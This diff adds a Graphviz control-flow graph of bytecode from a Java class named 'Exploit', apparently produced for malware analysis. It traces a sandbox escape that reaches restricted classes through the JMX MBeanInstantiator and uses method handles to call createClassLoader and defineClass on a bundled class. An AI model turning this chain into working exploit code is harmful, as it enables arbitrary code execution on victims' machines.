@@ -1,0 +1,272 @@
+digraph "" {
+    "r0 := @this: Exploit"
+    "new java.io.ByteArrayOutputStream"
+    "r0 := @this: Exploit"->"new java.io.ByteArrayOutputStream";
+    "store.r r6"
+    "new java.io.ByteArrayOutputStream"->"store.r r6";
+    "load.r r6"
+    "store.r r6"->"load.r r6";
+    "specialinvoke <java.io.ByteArrayOutputStream: void <init>()>"
+    "load.r r6"->"specialinvoke <java.io.ByteArrayOutputStream: void <init>()>";
+    "push 8192"
+    "specialinvoke <java.io.ByteArrayOutputStream: void <init>()>"->"push 8192";
+    "newarray"
+    "push 8192"->"newarray";
+    "store.r r5"
+    "newarray"->"store.r r5";
+    "load.r r0"
+    "store.r r5"->"load.r r0";
+    "virtualinvoke <java.lang.Object: java.lang.Class getClass()>"
+    "load.r r0"->"virtualinvoke <java.lang.Object: java.lang.Class getClass()>";
+    "push \"B.class\""
+    "virtualinvoke <java.lang.Object: java.lang.Class getClass()>"->"push \"B.class\"";
+    "virtualinvoke <java.lang.Class: java.io.InputStream getResourceAsStream(java.lang.String)>"
+    "push \"B.class\""->"virtualinvoke <java.lang.Class: java.io.InputStream getResourceAsStream(java.lang.String)>";
+    "store.r r1"
+    "virtualinvoke <java.lang.Class: java.io.InputStream getResourceAsStream(java.lang.String)>"->"store.r r1";
+    "goto load.r r1"
+    "store.r r1"->"goto load.r r1";
+    "load.r r1"
+    "goto load.r r1"->"load.r r1";
+    "load.r r5"
+    "load.r r1"->"load.r r5";
+    "virtualinvoke <java.io.InputStream: int read(byte[])>"
+    "load.r r5"->"virtualinvoke <java.io.InputStream: int read(byte[])>";
+    "store.i r7"
+    "virtualinvoke <java.io.InputStream: int read(byte[])>"->"store.i r7";
+    "load.i r7"
+    "store.i r7"->"load.i r7";
+    "ifgt load.r r6"
+    "load.i r7"->"ifgt load.r r6";
+    "ifgt load.r r6"->"load.r r6";
+    "virtualinvoke <java.io.ByteArrayOutputStream: byte[] toByteArray()>"
+    "load.r r6"->"virtualinvoke <java.io.ByteArrayOutputStream: byte[] toByteArray()>";
+    "virtualinvoke <java.io.ByteArrayOutputStream: byte[] toByteArray()>"->"store.r r1";
+    "new com.sun.jmx.mbeanserver.JmxMBeanServerBuilder"
+    "store.r r1"->"new com.sun.jmx.mbeanserver.JmxMBeanServerBuilder";
+    "dup1.r"
+    "new com.sun.jmx.mbeanserver.JmxMBeanServerBuilder"->"dup1.r";
+    "specialinvoke <com.sun.jmx.mbeanserver.JmxMBeanServerBuilder: void <init>()>"
+    "dup1.r"->"specialinvoke <com.sun.jmx.mbeanserver.JmxMBeanServerBuilder: void <init>()>";
+    "push \"\""
+    "specialinvoke <com.sun.jmx.mbeanserver.JmxMBeanServerBuilder: void <init>()>"->"push \"\"";
+    "push null"
+    "push \"\""->"push null";
+    "push null"->"push null";
+    "virtualinvoke <com.sun.jmx.mbeanserver.JmxMBeanServerBuilder: javax.management.MBeanServer newMBeanServer(java.lang.String,javax.management.MBeanServer,javax.management.MBeanServerDelegate)>"
+    "push null"->"virtualinvoke <com.sun.jmx.mbeanserver.JmxMBeanServerBuilder: javax.management.MBeanServer newMBeanServer(java.lang.String,javax.management.MBeanServer,javax.management.MBeanServerDelegate)>";
+    "checkcast"
+    "virtualinvoke <com.sun.jmx.mbeanserver.JmxMBeanServerBuilder: javax.management.MBeanServer newMBeanServer(java.lang.String,javax.management.MBeanServer,javax.management.MBeanServerDelegate)>"->"checkcast";
+    "virtualinvoke <com.sun.jmx.mbeanserver.JmxMBeanServer: com.sun.jmx.mbeanserver.MBeanInstantiator getMBeanInstantiator()>"
+    "checkcast"->"virtualinvoke <com.sun.jmx.mbeanserver.JmxMBeanServer: com.sun.jmx.mbeanserver.MBeanInstantiator getMBeanInstantiator()>";
+    "virtualinvoke <com.sun.jmx.mbeanserver.JmxMBeanServer: com.sun.jmx.mbeanserver.MBeanInstantiator getMBeanInstantiator()>"->"dup1.r";
+    "push \"sun.org.mozilla.javascript.internal.Context\""
+    "dup1.r"->"push \"sun.org.mozilla.javascript.internal.Context\"";
+    "push \"sun.org.mozilla.javascript.internal.Context\""->"push null";
+    "virtualinvoke <com.sun.jmx.mbeanserver.MBeanInstantiator: java.lang.Class findClass(java.lang.String,java.lang.ClassLoader)>"
+    "push null"->"virtualinvoke <com.sun.jmx.mbeanserver.MBeanInstantiator: java.lang.Class findClass(java.lang.String,java.lang.ClassLoader)>";
+    "virtualinvoke <com.sun.jmx.mbeanserver.MBeanInstantiator: java.lang.Class findClass(java.lang.String,java.lang.ClassLoader)>"->"store.r r5";
+    "push \"sun.org.mozilla.javascript.internal.GeneratedClassLoader\""
+    "store.r r5"->"push \"sun.org.mozilla.javascript.internal.GeneratedClassLoader\"";
+    "push \"sun.org.mozilla.javascript.internal.GeneratedClassLoader\""->"push null";
+    "push null"->"virtualinvoke <com.sun.jmx.mbeanserver.MBeanInstantiator: java.lang.Class findClass(java.lang.String,java.lang.ClassLoader)>";
+    "virtualinvoke <com.sun.jmx.mbeanserver.MBeanInstantiator: java.lang.Class findClass(java.lang.String,java.lang.ClassLoader)>"->"store.r r6";
+    "store.r r6"->"load.r r6";
+    "staticinvoke <java.lang.invoke.MethodHandles: java.lang.invoke.MethodHandles$Lookup publicLookup()>"
+    "load.r r6"->"staticinvoke <java.lang.invoke.MethodHandles: java.lang.invoke.MethodHandles$Lookup publicLookup()>";
+    "store.r r7"
+    "staticinvoke <java.lang.invoke.MethodHandles: java.lang.invoke.MethodHandles$Lookup publicLookup()>"->"store.r r7";
+    "load.r r7"
+    "store.r r7"->"load.r r7";
+    "push class \"Ljava/lang/invoke/MethodHandles$Lookup;\""
+    "load.r r7"->"push class \"Ljava/lang/invoke/MethodHandles$Lookup;\"";
+    "push \"findConstructor\""
+    "push class \"Ljava/lang/invoke/MethodHandles$Lookup;\""->"push \"findConstructor\"";
+    "push class \"Ljava/lang/invoke/MethodHandle;\""
+    "push \"findConstructor\""->"push class \"Ljava/lang/invoke/MethodHandle;\"";
+    "push class \"Ljava/lang/Class;\""
+    "push class \"Ljava/lang/invoke/MethodHandle;\""->"push class \"Ljava/lang/Class;\"";
+    "push 1"
+    "push class \"Ljava/lang/Class;\""->"push 1";
+    "push 1"->"newarray";
+    "newarray"->"dup1.r";
+    "push 0"
+    "dup1.r"->"push 0";
+    "push class \"Ljava/lang/invoke/MethodType;\""
+    "push 0"->"push class \"Ljava/lang/invoke/MethodType;\"";
+    "arraywrite.r"
+    "push class \"Ljava/lang/invoke/MethodType;\""->"arraywrite.r";
+    "staticinvoke <java.lang.invoke.MethodType: java.lang.invoke.MethodType methodType(java.lang.Class,java.lang.Class,java.lang.Class[])>"
+    "arraywrite.r"->"staticinvoke <java.lang.invoke.MethodType: java.lang.invoke.MethodType methodType(java.lang.Class,java.lang.Class,java.lang.Class[])>";
+    "virtualinvoke <java.lang.invoke.MethodHandles$Lookup: java.lang.invoke.MethodHandle findVirtual(java.lang.Class,java.lang.String,java.lang.invoke.MethodType)>"
+    "staticinvoke <java.lang.invoke.MethodType: java.lang.invoke.MethodType methodType(java.lang.Class,java.lang.Class,java.lang.Class[])>"->"virtualinvoke <java.lang.invoke.MethodHandles$Lookup: java.lang.invoke.MethodHandle findVirtual(java.lang.Class,java.lang.String,java.lang.invoke.MethodType)>";
+    "staticget <java.lang.Void: java.lang.Class TYPE>"
+    "virtualinvoke <java.lang.invoke.MethodHandles$Lookup: java.lang.invoke.MethodHandle findVirtual(java.lang.Class,java.lang.String,java.lang.invoke.MethodType)>"->"staticget <java.lang.Void: java.lang.Class TYPE>";
+    "staticinvoke <java.lang.invoke.MethodType: java.lang.invoke.MethodType methodType(java.lang.Class)>"
+    "staticget <java.lang.Void: java.lang.Class TYPE>"->"staticinvoke <java.lang.invoke.MethodType: java.lang.invoke.MethodType methodType(java.lang.Class)>";
+    "store.r r10"
+    "staticinvoke <java.lang.invoke.MethodType: java.lang.invoke.MethodType methodType(java.lang.Class)>"->"store.r r10";
+    "push 3"
+    "store.r r10"->"push 3";
+    "push 3"->"newarray";
+    "store.r r12"
+    "newarray"->"store.r r12";
+    "load.r r12"
+    "store.r r12"->"load.r r12";
+    "load.r r12"->"push 0";
+    "push 0"->"load.r r7";
+    "load.r r7"->"arraywrite.r";
+    "arraywrite.r"->"load.r r12";
+    "load.r r12"->"push 1";
+    "push 1"->"load.r r5";
+    "load.r r5"->"arraywrite.r";
+    "arraywrite.r"->"load.r r12";
+    "push 2"
+    "load.r r12"->"push 2";
+    "load.r r10"
+    "push 2"->"load.r r10";
+    "load.r r10"->"arraywrite.r";
+    "arraywrite.r"->"load.r r12";
+    "virtualinvoke <java.lang.invoke.MethodHandle: java.lang.Object invokeWithArguments(java.lang.Object[])>"
+    "load.r r12"->"virtualinvoke <java.lang.invoke.MethodHandle: java.lang.Object invokeWithArguments(java.lang.Object[])>";
+    "virtualinvoke <java.lang.invoke.MethodHandle: java.lang.Object invokeWithArguments(java.lang.Object[])>"->"checkcast";
+    "checkcast"->"push 0";
+    "push 0"->"newarray";
+    "newarray"->"virtualinvoke <java.lang.invoke.MethodHandle: java.lang.Object invokeWithArguments(java.lang.Object[])>";
+    "virtualinvoke <java.lang.invoke.MethodHandle: java.lang.Object invokeWithArguments(java.lang.Object[])>"->"store.r r12";
+    "store.r r12"->"push 2";
+    "push 2"->"newarray";
+    "newarray"->"store.r r10";
+    "store.r r10"->"load.r r10";
+    "load.r r10"->"push 0";
+    "push class \"Ljava/lang/String;\""
+    "push 0"->"push class \"Ljava/lang/String;\"";
+    "push class \"Ljava/lang/String;\""->"arraywrite.r";
+    "arraywrite.r"->"load.r r10";
+    "load.r r10"->"push 1";
+    "push 1"->"push class \"Ljava/lang/invoke/MethodType;\"";
+    "push class \"Ljava/lang/invoke/MethodType;\""->"arraywrite.r";
+    "arraywrite.r"->"load.r r7";
+    "load.r r7"->"push class \"Ljava/lang/invoke/MethodHandles$Lookup;\"";
+    "push \"findVirtual\""
+    "push class \"Ljava/lang/invoke/MethodHandles$Lookup;\""->"push \"findVirtual\"";
+    "push \"findVirtual\""->"push class \"Ljava/lang/invoke/MethodHandle;\"";
+    "push class \"Ljava/lang/invoke/MethodHandle;\""->"push class \"Ljava/lang/Class;\"";
+    "push class \"Ljava/lang/Class;\""->"load.r r10";
+    "load.r r10"->"staticinvoke <java.lang.invoke.MethodType: java.lang.invoke.MethodType methodType(java.lang.Class,java.lang.Class,java.lang.Class[])>";
+    "staticinvoke <java.lang.invoke.MethodType: java.lang.invoke.MethodType methodType(java.lang.Class,java.lang.Class,java.lang.Class[])>"->"virtualinvoke <java.lang.invoke.MethodHandles$Lookup: java.lang.invoke.MethodHandle findVirtual(java.lang.Class,java.lang.String,java.lang.invoke.MethodType)>";
+    "virtualinvoke <java.lang.invoke.MethodHandles$Lookup: java.lang.invoke.MethodHandle findVirtual(java.lang.Class,java.lang.String,java.lang.invoke.MethodType)>"->"store.r r10";
+    "push class \"Ljava/lang/ClassLoader;\""
+    "store.r r10"->"push class \"Ljava/lang/ClassLoader;\"";
+    "staticinvoke <java.lang.invoke.MethodType: java.lang.invoke.MethodType methodType(java.lang.Class,java.lang.Class)>"
+    "push class \"Ljava/lang/ClassLoader;\""->"staticinvoke <java.lang.invoke.MethodType: java.lang.invoke.MethodType methodType(java.lang.Class,java.lang.Class)>";
+    "store.r r15"
+    "staticinvoke <java.lang.invoke.MethodType: java.lang.invoke.MethodType methodType(java.lang.Class,java.lang.Class)>"->"store.r r15";
+    "push 4"
+    "store.r r15"->"push 4";
+    "push 4"->"newarray";
+    "store.r $r31"
+    "newarray"->"store.r $r31";
+    "load.r $r31"
+    "store.r $r31"->"load.r $r31";
+    "load.r $r31"->"push 0";
+    "push 0"->"load.r r7";
+    "load.r r7"->"arraywrite.r";
+    "arraywrite.r"->"load.r $r31";
+    "load.r $r31"->"push 1";
+    "push 1"->"load.r r5";
+    "load.r r5"->"arraywrite.r";
+    "arraywrite.r"->"load.r $r31";
+    "load.r $r31"->"push 2";
+    "push \"createClassLoader\""
+    "push 2"->"push \"createClassLoader\"";
+    "push \"createClassLoader\""->"arraywrite.r";
+    "arraywrite.r"->"load.r $r31";
+    "load.r $r31"->"push 3";
+    "load.r r15"
+    "push 3"->"load.r r15";
+    "load.r r15"->"arraywrite.r";
+    "arraywrite.r"->"load.r r10";
+    "load.r r10"->"load.r $r31";
+    "load.r $r31"->"virtualinvoke <java.lang.invoke.MethodHandle: java.lang.Object invokeWithArguments(java.lang.Object[])>";
+    "virtualinvoke <java.lang.invoke.MethodHandle: java.lang.Object invokeWithArguments(java.lang.Object[])>"->"checkcast";
+    "checkcast"->"push 2";
+    "push 2"->"newarray";
+    "newarray"->"dup1.r";
+    "dup1.r"->"push 0";
+    "push 0"->"load.r r12";
+    "load.r r12"->"arraywrite.r";
+    "arraywrite.r"->"virtualinvoke <java.lang.invoke.MethodHandle: java.lang.Object invokeWithArguments(java.lang.Object[])>";
+    "virtualinvoke <java.lang.invoke.MethodHandle: java.lang.Object invokeWithArguments(java.lang.Object[])>"->"store.r r5";
+    "store.r r5"->"push class \"Ljava/lang/Class;\"";
+    "push class \"Ljava/lang/Class;\""->"push class \"Ljava/lang/String;\"";
+    "push class \"Ljava/lang/String;\""->"push 1";
+    "push 1"->"newarray";
+    "newarray"->"dup1.r";
+    "dup1.r"->"push 0";
+    "push class \"[B\""
+    "push 0"->"push class \"[B\"";
+    "push class \"[B\""->"arraywrite.r";
+    "arraywrite.r"->"staticinvoke <java.lang.invoke.MethodType: java.lang.invoke.MethodType methodType(java.lang.Class,java.lang.Class,java.lang.Class[])>";
+    "staticinvoke <java.lang.invoke.MethodType: java.lang.invoke.MethodType methodType(java.lang.Class,java.lang.Class,java.lang.Class[])>"->"store.r r12";
+    "store.r r12"->"push 4";
+    "push 4"->"newarray";
+    "newarray"->"store.r r15";
+    "store.r r15"->"load.r r15";
+    "load.r r15"->"push 0";
+    "push 0"->"load.r r7";
+    "load.r r7"->"arraywrite.r";
+    "arraywrite.r"->"load.r r15";
+    "load.r r15"->"push 1";
+    "push 1"->"load.r r6";
+    "load.r r6"->"arraywrite.r";
+    "arraywrite.r"->"load.r r15";
+    "load.r r15"->"push 2";
+    "push \"defineClass\""
+    "push 2"->"push \"defineClass\"";
+    "push \"defineClass\""->"arraywrite.r";
+    "arraywrite.r"->"load.r r15";
+    "load.r r15"->"push 3";
+    "push 3"->"load.r r12";
+    "load.r r12"->"arraywrite.r";
+    "arraywrite.r"->"load.r r10";
+    "load.r r10"->"load.r r15";
+    "load.r r15"->"virtualinvoke <java.lang.invoke.MethodHandle: java.lang.Object invokeWithArguments(java.lang.Object[])>";
+    "virtualinvoke <java.lang.invoke.MethodHandle: java.lang.Object invokeWithArguments(java.lang.Object[])>"->"checkcast";
+    "checkcast"->"push 3";
+    "push 3"->"newarray";
+    "newarray"->"store.r r6";
+    "store.r r6"->"load.r r6";
+    "load.r r6"->"push 0";
+    "push 0"->"load.r r5";
+    "load.r r5"->"arraywrite.r";
+    "arraywrite.r"->"load.r r6";
+    "load.r r6"->"push 2";
+    "push 2"->"load.r r1";
+    "load.r r1"->"arraywrite.r";
+    "arraywrite.r"->"load.r r6";
+    "load.r r6"->"virtualinvoke <java.lang.invoke.MethodHandle: java.lang.Object invokeWithArguments(java.lang.Object[])>";
+    "virtualinvoke <java.lang.invoke.MethodHandle: java.lang.Object invokeWithArguments(java.lang.Object[])>"->"checkcast";
+    "virtualinvoke <java.lang.Class: java.lang.Object newInstance()>"
+    "checkcast"->"virtualinvoke <java.lang.Class: java.lang.Object newInstance()>";
+    "pop"
+    "virtualinvoke <java.lang.Class: java.lang.Object newInstance()>"->"pop";
+    "pop"->"load.r r0";
+    "virtualinvoke <Exploit: void fileduestart()>"
+    "load.r r0"->"virtualinvoke <Exploit: void fileduestart()>";
+    "virtualinvoke <Exploit: void fileduestart()>"->"load.r r0";
+    "virtualinvoke <Exploit: void start()>"
+    "load.r r0"->"virtualinvoke <Exploit: void start()>";
+    "goto return"
+    "virtualinvoke <Exploit: void start()>"->"goto return";
+    "return"
+    "goto return"->"return";
+    "store.r r0"
+    "virtualinvoke <Exploit: void start()>"->"store.r r0";
+    "ifgt load.r r6"->"load.r r6";
+    "load.r r6"->"load.r r5";
+    "load.r r5"->"push 0";
+    "push 0"->"load.i r7";
+    "virtualinvoke <java.io.ByteArrayOutputStream: void write(byte[],int,int)>"
+    "load.i r7"->"virtualinvoke <java.io.ByteArrayOutputStream: void write(byte[],int,int)>";
+}
